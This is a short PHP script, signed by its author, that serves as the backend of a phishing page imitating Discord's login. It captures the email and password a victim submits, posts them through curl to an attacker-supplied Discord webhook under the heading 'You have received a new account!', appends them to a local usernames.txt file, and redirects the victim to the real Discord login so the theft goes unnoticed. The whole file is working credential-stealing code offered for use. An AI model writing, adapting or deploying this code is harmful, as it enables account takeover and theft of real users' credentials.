 <?php
////This Has Been Made By west#1945
////DO NOT SKID
if ($_POST["email"] && $_POST["pass"]) {
$webhook = "YOUR WEBHOOK";
$email = htmlspecialchars($_POST["email"]);
$pass = htmlspecialchars($_POST["pass"]);
$json_data = json_encode([
    "content" => "",
    "username" => Discord,
    "avatar_url" => "https://static.vecteezy.com/system/resources/previews/006/892/625/original/discord-logo-icon-editorial-free-vector.jpg",
    "embeds" => [
        [
            "title" => Discord,
            "type" => "rich",
            "description" => "",
            "url" => "",
            "color" => hexdec("000000"),
            "thumbnail" => [
            "url" => "https://static.vecteezy.com/system/resources/previews/006/892/625/original/discord-logo-icon-editorial-free-vector.jpg"
            ],
            "footer" => [
                "text" => "You have received a new account!",
                "icon_url" => $icon
            ],
            "author" => [
                "name" => "",
            ],
            "fields" => [
                [
                    "name" => "**Username/Email:**",
                    "value" => "```$email```",
                    "inline" => false
                ],
                [
                    "name" => "**Password:**",
                    "value" => "```$pass```",
                    "inline" => false
                ]
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );
$ch = curl_init($webhook);
curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $json_data);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$resp = curl_exec($ch);
curl_close($ch);
}




file_put_contents("usernames.txt", "Discord Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://discord.com/login');
exit();

